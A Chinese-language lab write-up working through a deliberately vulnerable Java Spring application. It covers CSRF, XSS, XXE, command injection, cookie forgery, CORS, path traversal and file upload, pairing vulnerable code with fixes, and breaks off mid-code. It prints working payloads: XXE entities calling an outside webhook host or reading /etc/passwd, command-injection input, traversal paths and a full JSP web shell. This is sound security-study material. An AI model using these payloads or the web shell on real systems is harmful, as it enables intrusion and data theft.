简单的说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己以前认证过的站点并运行一些操作（如发邮件，发消息，甚至财产操作（如转账和购买商品））。因为浏览器之前认证过，所以被访问的站点会觉得这是真正的用户操作而去运行。

**攻击流程：**

1. 用户在浏览器中登录了受信任的网站（如银行网站），并且拥有有效的会话。
2. 攻击者创建了一个恶意网站，嵌入了向受信任网站发送请求的代码。
3. 用户在登录受信任网站后，访问了攻击者的恶意网站，恶意网站在用户不知情的情况下，自动向受信任网站发送请求（如转账请求）。
4. 受信任的网站无法区分该请求是用户发起的还是攻击者伪造的，因此会执行这个请求

#### 1./csrf/post

```
@Controller
@RequestMapping("/csrf")
public class CSRF {

    @GetMapping("/")
    public String index() {
        return "form";
    }

    @PostMapping("/post")
    @ResponseBody
    public String post() {
        return "CSRF passed.";
    }
}

```

我们来看前端

```

<html xmlns:th="http://www.thymeleaf.org" lang="en">
<head>
    <script th:src="@{https://code.jquery.com/jquery-3.4.1.min.js}"></script>
</head>



<body>


<div>
    <!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field -->
    <!-- <form name="f" th:action="@{/csrf/post}" method="post"> -->
    <form name="f" action="/csrf/post" method="post">
        <input type="text" name="input" />
        <input type="submit" value="Submit" />
        <input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />
    </form>
</div>


</body>




</html>

```

该代码存在csrf漏洞，漏洞验证poc：

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>Simulating CSRF Attack</h1>

    <form id="csrfForm" action="http://127.0.0.1:8080/csrf/post" method="POST">
        <input type="hidden" name="message" value="This is a CSRF attack message">
    </form>

    <script>
        // 自动提交表单，执行攻击
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>

```

#### csrf的防护

1. 使用CSRF Token

在每个表单或请求中，加入一个随机生成的token，并将其与服务器端的token进行对比。这个token通常存储在用户的session中，每次请求时都要携带这个token，防止外部网站伪造请求。

- 在HTML表单中加入一个隐藏的input字段来传递CSRF token。
- 在服务器端验证请求中的token是否与存储的一致。

2. Referer Header 检查

检查请求中的`Referer` header，确保请求来源是合法的站点。尽管这一方法并不完全可靠，因为有些浏览器可能会限制或不发送`Referer`，但它可以作为额外的安全措施。

3. SameSite Cookie 属性

使用`SameSite`属性设置cookies，限制跨站请求时是否可以发送cookie。`SameSite`有三个值：
- `Strict`：完全禁止跨站请求携带cookie。
- `Lax`：只有部分跨站请求才携带cookie（例如从外部链接访问站点时）。
- `None`：允许跨站请求携带cookie，但必须设置`Secure`，即请求需要使用HTTPS。

4. HTTP 方法限制

对于敏感操作，尽量使用`POST`、`PUT`、`DELETE`等非GET方法，因为GET请求一般不带有请求体，容易被CSRF利用。并且可以通过在服务器端验证请求方法是否符合规范来增加安全性。

5. 验证码（CAPTCHA）

在执行重要操作（如提交表单或修改敏感信息）时，加入验证码验证，确保操作是由真实用户执行，而不是自动化脚本。

6. 双重身份验证（2FA）

结合身份验证措施，如短信验证码或应用生成的二次密码，在用户执行敏感操作时进一步确认其身份。



### XSS

#### 1./xss/reflect

```
    @RequestMapping("/reflect")
    @ResponseBody
    public static String reflect(String xss) {
        return xss;
    }
```

反射型xss

利用

```
?xss=<script>alert(1)</script>
```

![image-20250725164023603](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251640728.png)

#### 2./xss/stored

```
 @RequestMapping("/stored/store")
    @ResponseBody
    public String store(String xss, HttpServletResponse response) {
        Cookie cookie = new Cookie("xss", xss);
        response.addCookie(cookie);
        return "Set param into cookie";
    }

    /**
     * Vul Code.
     * StoredXSS Step2
     * http://localhost:8080/xss/stored/show
     *
     * @param xss unescape string
     */
    @RequestMapping("/stored/show")
    @ResponseBody
    public String show(@CookieValue("xss") String xss) {
        return xss;
    }

```

存储型xss，我们先在/stored/store路由存入Cookie

```
?xss=<script>alert(1)</script>
```

![image-20250725164345723](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251643828.png)

然后在/stored/show路由攻击

![image-20250725164425228](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251644303.png)

#### xss防护

```
 /**
     * safe Code.
     * http://localhost:8080/xss/safe
     */
    @RequestMapping("/safe")
    @ResponseBody
    public static String safe(String xss) {
        return encode(xss);
    }

    private static String encode(String origin) {
        origin = StringUtils.replace(origin, "&", "&amp;");
        origin = StringUtils.replace(origin, "<", "&lt;");
        origin = StringUtils.replace(origin, ">", "&gt;");
        origin = StringUtils.replace(origin, "\"", "&quot;");
        origin = StringUtils.replace(origin, "'", "&#x27;");
        origin = StringUtils.replace(origin, "/", "&#x2F;");
        return origin;
    }
}

```

把需要的字符都过滤了基本就防完了xss攻击



### XXE

#### 1./xxe/xmlReader/vuln

```java
    @PostMapping("/xmlReader/vuln")
    public String xmlReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);
            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml
            return "xmlReader xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

#### 2./xxe/SAXBuilder/vuln

```
@RequestMapping(value = "/SAXBuilder/vuln", method = RequestMethod.POST)
    public String SAXBuilderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXBuilder builder = new SAXBuilder();
            // org.jdom2.Document document
            builder.build(new InputSource(new StringReader(body)));  // cause xxe
            return "SAXBuilder xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }
```

换用SAXReader第三方库，攻击手法同上（注意请求要以http格式进行解析）：

```
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7">]><root>&xxe;</root>

```

![image-20250725171230237](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507251712331.png)

#### 修复代码

通过`setFeature`关闭DTD和外部实体解析从而防止了xxe

```
    @RequestMapping(value = "/xmlReader/sec", method = RequestMethod.POST)
    public String xmlReaderSec(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // fix code start
            xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
            xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
            //fix code end
            xmlReader.parse(new InputSource(new StringReader(body)));  // parse xml

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "xmlReader xxe security code";
    }
```

#### 3./xxe/SAXReader/vuln

```
@RequestMapping(value = "/SAXReader/vuln", method = RequestMethod.POST)
    public String SAXReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXReader reader = new SAXReader();
            // org.dom4j.Document document
            reader.read(new InputSource(new StringReader(body))); // cause xxe

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "SAXReader xxe vuln code";
    }

```

和前两个的payload一样但区别是这个有回显



#### 4./xxe/SAXParser/vuln

```
  @RequestMapping(value = "/SAXParser/vuln", method = RequestMethod.POST)
    public String SAXParserVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser parser = spf.newSAXParser();
            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  // parse xml

            return "SAXParser xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

```

#### 5./xxe/Digester/vuln

```
@RequestMapping(value = "/Digester/vuln", method = RequestMethod.POST)
    public String DigesterVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            Digester digester = new Digester();
            digester.parse(new StringReader(body));  // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
        return "Digester xxe vuln code";
    }

```

#### 6./xxe/DocumentBuilder/vuln

```
@RequestMapping(value = "/DocumentBuilder/vuln", method = RequestMethod.POST)
    public String DocumentBuilderVuln(HttpServletRequest request) {
        try {
            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            DocumentBuilder db = dbf.newDocumentBuilder();
            InputSource is = new InputSource(request.getInputStream());
            Document document = db.parse(is);  // parse xml

            // 遍历xml节点name和value
            StringBuilder buf = new StringBuilder();
            NodeList rootNodeList = document.getChildNodes();
            for (int i = 0; i < rootNodeList.getLength(); i++) {
                Node rootNode = rootNodeList.item(i);
                NodeList child = rootNode.getChildNodes();
                for (int j = 0; j < child.getLength(); j++) {
                    Node node = child.item(j);
                    buf.append(String.format("%s: %s\n", node.getNodeName(), node.getTextContent()));
                }
            }
            return buf.toString();
        } catch (Exception e) {
            e.printStackTrace();
            logger.error(e.toString());
            return e.toString();
        }
    }

```

这是JDK自带的类，以此产生的XXE是存在回显的

#### 7./xxe/DocumentBuilder/xinclude/vuln

```
@RequestMapping(value = "/DocumentBuilder/xinclude/vuln", method = RequestMethod.POST)
    public String DocumentBuilderXincludeVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
            dbf.setXIncludeAware(true);   // 支持XInclude
            dbf.setNamespaceAware(true);  // 支持XInclude
            DocumentBuilder db = dbf.newDocumentBuilder();
            StringReader sr = new StringReader(body);
            InputSource is = new InputSource(sr);
            Document document = db.parse(is);  // parse xml

            NodeList rootNodeList = document.getChildNodes();
            response(rootNodeList);

            sr.close();
            return "DocumentBuilder xinclude xxe vuln code";
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }
    }

```

#### 8./xxe/XMLReader/vuln

```
@PostMapping("/XMLReader/vuln")
    public String XMLReaderVuln(HttpServletRequest request) {
        try {
            String body = WebUtils.getRequestBody(request);
            logger.info(body);

            SAXParserFactory spf = SAXParserFactory.newInstance();
            SAXParser saxParser = spf.newSAXParser();
            XMLReader xmlReader = saxParser.getXMLReader();
            xmlReader.parse(new InputSource(new StringReader(body)));

        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "XMLReader xxe vuln code";
    }

```

#### 9./xxe/DocumentHelper/vuln

```
@PostMapping("/DocumentHelper/vuln")
    public String DocumentHelper(HttpServletRequest req) {
        try {
            String body = WebUtils.getRequestBody(req);
            DocumentHelper.parseText(body); // parse xml
        } catch (Exception e) {
            logger.error(e.toString());
            return EXCEPT;
        }

        return "DocumentHelper xxe vuln code";
    }


    private static void response(NodeList rootNodeList){
        for (int i = 0; i < rootNodeList.getLength(); i++) {
            Node rootNode = rootNodeList.item(i);
            NodeList xxe = rootNode.getChildNodes();
            for (int j = 0; j < xxe.getLength(); j++) {
                Node xxeNode = xxe.item(j);
                // 测试不能blind xxe，所以强行加了一个回显
                logger.info("xxeNode: " + xxeNode.getNodeValue());
            }

        }
    }

```

修复该漏洞只需升级dom4j到2.1.1及以上，该版本及以上禁用了ENTITY；不带ENTITY的PoC不能利用，所以禁用ENTITY即可完成修复。

#### 上述存在XXE漏洞库对比

| **工具/类**      | **简介**                                                 | **使用场景**                                  | **优点**                            | **缺点**                             |
| :--------------- | :------------------------------------------------------- | :-------------------------------------------- | :---------------------------------- | :----------------------------------- |
| `xmlReader`      | SAX 的接口，基于事件驱动的解析                           | 处理大型 XML 文件                             | 内存占用小，速度快                  | 需要手动管理上下文，处理复杂结构困   |
| `SAXBuilder`     | JDOM 中基于 SAX 的解析器                                 | 需要用 JDOM 处理 XML 数据时                   | 结合了 SAX 的高效性和 JDOM 的易用性 | 解析速度依赖于 SAX，灵活性低于 DOM   |
| SAXReader`       | Dom4j 中基于 SAX 的解析器                                | 需要 Dom4j 进行 XML 操作时                    | 高效且灵活，支持树结构              | 性能略逊于纯 SAX                     |
| `SAXParser`      | Java 中的 SAX 解析器                                     | 基于事件驱动的解析，适合处理大型 XML 文件     | 高效，内存占用小                    | 解析复杂 XML 需要手动处理回调        |
| Digester`        | 基于 SAX，将 XML 映射到 Java 对象（Apache Commons 提供） | 需要将 XML 映射为 Java 对象时                 | 简化 XML 与 Java 对象的映射         | 对大文件不友好，灵活性较低           |
| DocumentBuilder` | Java 中 DOM 解析器，用于构建树状结构                     | 需要完整树结构操作，如修改和多次遍历 XML 文件 | 完整保留文档结构，易于查找和修改    | 内存占用较大，处理大文件时性能较差   |
| `DocumentHelper` | Dom4j 提供的辅助类，用于快速创建和操作 XML 文档          | 需要手动构建和操作 XML 文档时                 | 快速创建和处理 XML 文档，灵活性高   | 内存占用较大，处理超大文件时性能不佳 |

#### 统一漏洞利用payload

```
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7">]><root>&xxe;</root>

```

![image-20250728112724781](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281127895.png)

#### 统一修复代码

```
//实例化解析类之后通常会支持着三个配置
obj.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
obj.setFeature("http://xml.org/sax/features/external-general-entities", false);
obj.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

```

禁用了外部实体，限制实体来源。

#### 10./xxe/xmlbeam/vuln

```
        @PostMapping(value = "/xmlbeam/vuln")
        HttpEntity<String> post(@RequestBody UserPayload user) {
            try {
                logger.info(user.toString());
                return ResponseEntity.ok(String.format("hello, %s!", user.getUserName()));
            }catch (Exception e){
                e.printStackTrace();
                return ResponseEntity.ok("error");
            }
        }

        /**
         * The projection interface using XPath and JSON Path expression to selectively pick elements from the payload.
         */
        @ProjectedPayload
        public interface UserPayload {
            @XBRead("//userName")
            String getUserName();
        }

```

该代码需要使用固定的标签可以实现回显，我们可以构造payload：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
    <!ENTITY xxe SYSTEM "file:///etc/passwd">  
]>
<userPayload>
    <userName>&xxe;</userName>
</userPayload>

```

![image-20250728144316073](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281443153.png)

#### 11/ooxml/readxlsx

```
 @PostMapping("/readxlsx")
    @ResponseBody
    public String ooxml_xxe(MultipartFile file) throws IOException {
        XSSFWorkbook wb = new XSSFWorkbook(file.getInputStream()); // xxe vuln

        XSSFSheet sheet = wb.getSheetAt(0);
        XSSFRow row;
        XSSFCell cell;

        Iterator rows = sheet.rowIterator();
        StringBuilder sbResult = new StringBuilder();

        while (rows.hasNext()) {

            row = (XSSFRow) rows.next();
            Iterator cells = row.cellIterator();

            while (cells.hasNext()) {
                cell = (XSSFCell) cells.next();

                if (cell.getCellType() == XSSFCell.CELL_TYPE_STRING) {
                    sbResult.append(cell.getStringCellValue()).append(" ");
                } else if (cell.getCellType() == XSSFCell.CELL_TYPE_NUMERIC) {
                    sbResult.append(cell.getNumericCellValue()).append(" ");
                } else {
                    logger.info("errors");
                }
            }
        }

        return sbResult.toString();
    }

```

查看源码得知使用的是poi-ooxml组件（ Apache POI是提供Microsoft Office系列文档读、写功能的 JAVA 类库）进行xlsx文件操作，在3.10版本及以下存在XXE注入漏洞，3.15以下版本存在Dos漏洞，这里使用的是3.9版本。

![image-20250728114555336](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281145386.png)

我们新建一个1.xlsx，用7-zip打开这个文件的压缩包

![image-20250728141719633](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281417899.png)

然后修改[Content_Types].xml文件，在最上面添加

```
<!DOCTYPE test [
    <!ELEMENT foo ANY>
    <!ENTITY xxe SYSTEM "	http://webhook.site/186f2ce9-cf0c-4eda-ad3f-49c3873814a7">
]>
<test>&xxe;</test>
```

在upload路由下上传这个1.xlsx，我们在webhook能发现这个文件执行成功了

![image-20250728141829969](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281418084.png)

#### 12./xlsx-streamer/readxlsx

```
 @PostMapping("/readxlsx")
    public void xllx_streamer_xxe(MultipartFile file) throws IOException {
        StreamingReader.builder().open(file.getInputStream());
    }

```

和上题相比就是换了个库的区别，payload一样的



### Commandinject

#### 1./codeinject

```java
    @GetMapping("/codeinject")
    public String codeInject(String filepath) throws IOException {

        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filepath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }

```

将传入的参数直接与原命令拼接，实现命令注入

```
?filepath=;cat /etc/passwd
```

![image-20250728143906716](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281439849.png)

#### 2./codeinject/host

```
@GetMapping("/codeinject/host")
    public String codeInjectHost(HttpServletRequest request) throws IOException {

        String host = request.getHeader("host");
        logger.info(host);
        String[] cmdList = new String[]{"sh", "-c", "curl " + host};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }

```

同样可以使用命令拼接，但需要再host字段处进行传参（不知道为啥我传不上去，用大佬的图片代替一下）

![image-20250728145951030](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507281459171.png)

#### 漏洞修复

修复代码

```
    @GetMapping("/codeinject/sec")
    public String codeInjectSec(String filepath) throws IOException {
        String filterFilePath = SecurityUtil.cmdFilter(filepath);
        if (null == filterFilePath) {
            return "Bad boy. I got u.";
        }
        String[] cmdList = new String[]{"sh", "-c", "ls -la " + filterFilePath};
        ProcessBuilder builder = new ProcessBuilder(cmdList);
        builder.redirectErrorStream(true);
        Process process = builder.start();
        return WebUtils.convertStreamToString(process.getInputStream());
    }
```

cmdFilter函数代码：

```
private static final Pattern FILTER_PATTERN = Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
   public static String cmdFilter(String input) {
        if (!FILTER_PATTERN.matcher(input).matches()) {
            return null;
        }

        return input;
    }
```

限制了参数中的字符，防止命令注入。



### Cookie伪造

#### 1./cookie/vuln01

```
    private static String NICK = "nick";

    @GetMapping(value = "/vuln01")
    public String vuln01(HttpServletRequest req) {
        String nick = WebUtils.getCookieValueByName(req, NICK); // key code
        return "Cookie nick: " + nick;
    }
```

#### 2./cookie/vuln02

```
 @GetMapping(value = "/vuln02")
    public String vuln02(HttpServletRequest req) {
        String nick = null;
        Cookie[] cookie = req.getCookies();

        if (cookie != null) {
            nick = getCookie(req, NICK).getValue();  // key code
        }

        return "Cookie nick: " + nick;
    }

```

#### 3./cookie/vuln03

```
   @GetMapping(value = "/vuln03")
    public String vuln03(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                // key code. Equals can also be equalsIgnoreCase.
                if (NICK.equals(cookie.getName())) {
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }
Java复制代码1234567891011121314
```

#### 4./cookie/vuln04

```
@GetMapping(value = "/vuln04")
    public String vuln04(HttpServletRequest req) {
        String nick = null;
        Cookie cookies[] = req.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equalsIgnoreCase(NICK)) {  // key code
                    nick = cookie.getValue();
                }
            }
        }
        return "Cookie nick: " + nick;
    }

```

#### 5./cookie/vuln05

```
   @GetMapping(value = "/vuln05")
    public String vuln05(@CookieValue("nick") String nick) {
        return "Cookie nick: " + nick;
    }
```

#### 6./cookie/vuln06

```
@GetMapping(value = "/vuln06")
    public String vuln06(@CookieValue(value = "nick") String nick) {
        return "Cookie nick: " + nick;
    }
```

#### 漏洞利用.

我们可以直接通过修改cookie的值实现对nick值的修改，某些情况可能会存在越权漏洞，操作如下：

![image-20250729104624089](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291046226.png)



### CORS

#### 原理

**跨源资源共享**（CORS，全称为 Cross-Origin Resource Sharing）是一种基于 HTTP 头的机制，允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。CORS 机制通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的“预检”请求。

比如说：有两个域a1.com和b1.com，假设b1.com上面有个接口能够获取一些返回的数据，那么如果我们从a1.com写一段js去请求这个接口的数据，一般来说是请求不了的，会在浏览器爆出CORS错误，但如果有CORS设置，就可以实现这样的访问，甚至可以能够使用b1.com上的cookie。

#### 1./cors/vuln/origin

    private static String info = "{\"name\": \"JoyChou\", \"phone\": \"18200001111\"}";
    
    @GetMapping("/vuln/origin")
    public String vuls1(HttpServletRequest request, HttpServletResponse response) {
        String origin = request.getHeader("origin");
        response.setHeader("Access-Control-Allow-Origin", origin); // set origin from header
        response.setHeader("Access-Control-Allow-Credentials", "true");  // allow cookie
        return info;
    }

#### 2./cors/vuln/setHeader

```
@GetMapping("/vuln/setHeader")
    public String vuls2(HttpServletResponse response) {
        // 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常
        response.setHeader("Access-Control-Allow-Origin", "*");
        return info;
    }

```

#### 3./cors/vuln/crossOrigin

```
    @GetMapping("*")
    @RequestMapping("/vuln/crossOrigin")
    public String vuls3() {
        return info;
    }

```

#### 漏洞验证

我们可以通过修改origin字段来验证漏洞

![image-20250729140718474](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507291407579.png)

#### 漏洞防御

##### （1）限制origin

```
  @CrossOrigin(origins = {"joychou.org", "http://test.joychou.me"})
    @GetMapping("/sec/crossOrigin")
    public String secCrossOrigin() {
        return info;
    }

```

##### （2）WebMvcConfigurer设置Cors

```
  @GetMapping("/sec/webMvcConfigurer")
    public CsrfToken getCsrfToken_01(CsrfToken token) {
        return token;
    }

```

对应的过滤器

```
    public WebMvcConfigurer corsConfigurer() {
        return new WebMvcConfigurerAdapter() {
            @Override
            public void addCorsMappings(CorsRegistry registry) {
                // 为了支持一级域名，重写了checkOrigin
                //String[] allowOrigins = {"joychou.org", "http://test.joychou.me"};
                registry.addMapping("/cors/sec/webMvcConfigurer") // /**表示所有路由path
                        //.allowedOrigins(allowOrigins)
                        .allowedMethods("GET", "POST")
                        .allowCredentials(true);
            }
        };
    }

```

##### （3）spring security设置cors

```
@GetMapping("/sec/httpCors")
public CsrfToken getCsrfToken_02(CsrfToken token) {
    return token;
}

```

对应过滤器：

```
    CorsConfigurationSource corsConfigurationSource()
    {
        // Set cors origin white list
        ArrayList<String> allowOrigins = new ArrayList<>();
        allowOrigins.add("joychou.org");
        allowOrigins.add("https://test.joychou.me"); // 区分http和https，并且默认不会拦截同域请求。

        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(allowOrigins);
        configuration.setAllowCredentials(true);
        configuration.setAllowedMethods(Arrays.asList("GET", "POST"));
        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/cors/sec/httpCors", configuration); // ant style
        return source;
    }

```

##### （4）自定义filter设置cors

防御代码：

```
    @GetMapping("/sec/originFilter")
    public CsrfToken getCsrfToken_03(CsrfToken token) {
        return token;
    }
```

对应过滤器：

```
@WebFilter(filterName = "OriginFilter", urlPatterns = "/cors/sec/originFilter")
public class OriginFilter implements Filter {

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    private final Logger logger = LoggerFactory.getLogger(this.getClass());

    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain filterChain)
            throws IOException, ServletException {

        HttpServletRequest request = (HttpServletRequest) req;
        HttpServletResponse response = (HttpServletResponse) res;

        String origin = request.getHeader("Origin");
        logger.info("[+] Origin: " + origin + "\tCurrent url:" + request.getRequestURL());

        // 以file协议访问html，origin为字符串的null，所以依然会走安全check逻辑
        if (origin != null && SecurityUtil.checkURL(origin) == null) {
            logger.error("[-] Origin check error. " + "Origin: " + origin +
                    "\tCurrent url:" + request.getRequestURL());
            response.setStatus(response.SC_FORBIDDEN);
            response.getWriter().println("Invaid cors config by joychou.");
            return;
        }

        response.setHeader("Access-Control-Allow-Origin", origin);
        response.setHeader("Access-Control-Allow-Credentials", "true");
        response.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTION");

        filterChain.doFilter(req, res);
    }
```

##### （5）CorsFilter设置cors

防御代码：

```
 @RequestMapping("/sec/corsFilter")
    public CsrfToken getCsrfToken_04(CsrfToken token) {
        return token;
    }
```

对应过滤器：

```
public class BaseCorsFilter extends CorsFilter {

    public BaseCorsFilter() {
        super(configurationSource());
    }

    private static UrlBasedCorsConfigurationSource configurationSource() {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowCredentials(true);
        config.addAllowedOrigin("joychou.org"); // 不支持
        config.addAllowedOrigin("http://test.joychou.me");
        config.addAllowedHeader("*");
        config.addAllowedMethod("GET");
        config.addAllowedMethod("POST");

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/cors/sec/corsFilter", config);

        return source;
    }
}
```

##### （6）origin检查

防御代码：

```
    @GetMapping("/sec/checkOrigin")
    public String seccode(HttpServletRequest request, HttpServletResponse response) {
        String origin = request.getHeader("Origin");

        // 如果origin不为空并且origin不在白名单内，认定为不安全。
        // 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。
        if (origin != null && SecurityUtil.checkURL(origin) == null) {
            return "Origin is not safe.";
        }
        response.setHeader("Access-Control-Allow-Origin", origin);
        response.setHeader("Access-Control-Allow-Credentials", "true");
        return LoginUtils.getUserInfo2JsonStr(request);
    }
```



### 目录遍历

#### 1./path_traversal/vul

漏洞代码：

```
  @GetMapping("/path_traversal/vul")
    public String getImage(String filepath) throws IOException {
        return getImgBase64(filepath);
    }
private String getImgBase64(String imgFile) throws IOException {

        logger.info("Working directory: " + System.getProperty("user.dir"));
        logger.info("File path: " + imgFile);

        File f = new File(imgFile);
        if (f.exists() && !f.isDirectory()) {
            byte[] data = Files.readAllBytes(Paths.get(imgFile));
            return new String(Base64.encodeBase64(data));
        } else {
            return "File doesn't exist or is not a file.";
        }
    }
```

存在目录穿越，我们直接读取文件

![image-20250730110528049](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202507301105109.png)

修复代码：

```
    @GetMapping("/path_traversal/sec")
    public String getImageSec(String filepath) throws IOException {
        if (SecurityUtil.pathFilter(filepath) == null) {
            logger.info("Illegal file path: " + filepath);
            return "Bad boy. Illegal file path.";
        }
        return getImgBase64(filepath);
    }
```

pathFilter函数内容：

```
 public static String pathFilter(String filepath) {
        String temp = filepath;

        // use while to sovle multi urlencode
        while (temp.indexOf('%') != -1) {
            try {
                temp = URLDecoder.decode(temp, "utf-8");
            } catch (UnsupportedEncodingException e) {
                logger.info("Unsupported encoding exception: " + filepath);
                return null;
            } catch (Exception e) {
                logger.info(e.toString());
                return null;
            }
        }

        if (temp.contains("..") || temp.charAt(0) == '/') {
            return null;
        }

        return filepath;
    }
```

对文件路径参数增加了过滤方法pathFilter，如果文件路径开头为/字符或者存在..连续字符出现就返回空字符串，但是这种过滤只是简单的应对措施，如果是Windows操作系统上以盘符开始的路径，就显得无能为力。例如使用\读取（windows下）

```
/path_traversal/sec?filepath=..\..\..\..\..\windows\win.ini
```



### 文件上传

#### 1./file/upload

```
    @PostMapping("/upload")
    public String singleFileUpload(@RequestParam("file") MultipartFile file,
                                   RedirectAttributes redirectAttributes) {
        if (file.isEmpty()) {
            // 赋值给uploadStatus.html里的动态参数message
            redirectAttributes.addFlashAttribute("message", "Please select a file to upload");
            return "redirect:/file/status";
        }

        try {
            // Get the file and save it somewhere
            byte[] bytes = file.getBytes();
            Path path = Paths.get(UPLOADED_FOLDER + file.getOriginalFilename());
            Files.write(path, bytes);

            redirectAttributes.addFlashAttribute("message",
                    "You successfully uploaded '" + UPLOADED_FOLDER + file.getOriginalFilename() + "'");

        } catch (IOException e) {
            redirectAttributes.addFlashAttribute("message", "upload failed");
            logger.error(e.toString());
        }

        return "redirect:/file/status";
    }

```

文件上传到方法中，未判断文件的类型、扩展名等信息，也未对生成文件的文件名进行重置，只是直接将文件上传到文件保存目录中，使用测试文件成功上传。构造一句话木马：

```
<% if ("pass".equals(request.getParameter("pwd"))) { java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b)) != -1) out.println(new String(b)); } %>

```

保存为shell.jsp进行上传，然后传入参数pwd=pass&cmd=whoami



修复代码

```
    @PostMapping("/upload/picture")
    @ResponseBody
    public String uploadPicture(@RequestParam("file") MultipartFile multifile) throws Exception {
        if (multifile.isEmpty()) {
            return "Please select a file to upload";
        }

        String fileName = multifile.getOriginalFilename();
        String Suffix = fileName.substring(fileName.lastIndexOf(".")); // 获取文件后缀名
        String mimeType = multifile.getContentType(); // 获取MIME类型
        String filePath = UPLOADED_FOLDER + fileName;
        File excelFile = convert(multifile);


        // 判断文件后缀名是否在白名单内  校验1
        String[] picSuffixList = {".jpg", ".png", ".jpeg", ".gif", ".bmp", ".ico"};
        boolean suffixFlag = false;
        for (String white_suffix : picSuffixList) {
            if (Suffix.toLowerCase().equals(white_suffix)) {
                suffixFlag = true;
                break;
            }
        }
        if (!suffixFlag) {
            logger.error("[-] Suffix error: " + Suffix);
            deleteFile(filePath);
            return "Upload failed. Illeagl picture.";
        }


